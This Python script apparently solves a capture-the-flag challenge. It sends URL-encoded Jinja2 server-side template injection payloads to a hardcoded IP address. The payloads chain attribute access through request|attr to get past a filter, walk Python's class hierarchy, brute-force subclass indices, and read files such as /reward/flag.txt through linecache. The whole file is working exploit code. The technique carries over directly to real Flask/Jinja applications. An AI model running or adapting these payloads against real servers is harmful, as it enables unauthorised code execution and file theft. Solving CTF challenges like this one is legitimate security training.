import requests

url = "http://103.163.139.198:8888/"

# Test payloads incrementally
payloads = [
    "request%7Cattr%28%27__class__%27%29",
    "request%7Cattr%28%27__class__%27%29%7Cattr%28%27__mro__%27%29",
    "request%7Cattr%28%27__class__%27%29%7Cattr%28%27__mro__%27%29%7Cattr%28%27__getitem__%27%29%281%29",
    "request%7Cattr%28%27__class__%27%29%7Cattr%28%27__mro__%27%29%7Cattr%28%27__getitem__%27%29%281%29%7Cattr%28%27__subclasses__%27%29%28%29",
]

# Test class indices 40–60
for index in range(40, 61):
    payload = f"request%7Cattr%28%27__class__%27%29%7Cattr%28%27__mro__%27%29%7Cattr%28%27__getitem__%27%29%281%29%7Cattr%28%27__subclasses__%27%29%28%29%7Cattr%28%27__getitem__%27%29%28{index}%29"
    payloads.append(payload)

# Test final payloads with different file paths
file_paths = ['/reward/flag.txt', 'reward/flag.txt', './reward/flag.txt', '/flag.txt']
for index in range(40, 61):
    for path in file_paths:
        encoded_path = path.replace('/', '%2F')
        payload = f"request%7Cattr%28%27__class__%27%29%7Cattr%28%27__mro__%27%29%7Cattr%28%27__getitem__%27%29%281%29%7Cattr%28%27__subclasses__%27%29%28%29%7Cattr%28%27__getitem__%27%29%28{index}%29%7Cattr%28%27__init__%27%29%7Cattr%28%27__globals__%27%29%7Cattr%28%27__getitem__%27%29%28%27linecache%27%29%7Cattr%28%27getlines%27%29%28%27{encoded_path}%27%29"
        payloads.append(payload)

for payload in payloads:
    params = {"content": payload}
    try:
        response = requests.get(url, params=params, timeout=5)
        if "Nice try" not in response.text and "Ouch!" not in response.text:
            print(f"Payload succeeded: {payload}")
            print(response.text)
            if "FLAG" in response.text:
                print("Flag found!")
                break
    except requests.RequestException as e:
        print(f"Payload failed: {payload} - Error: {e}")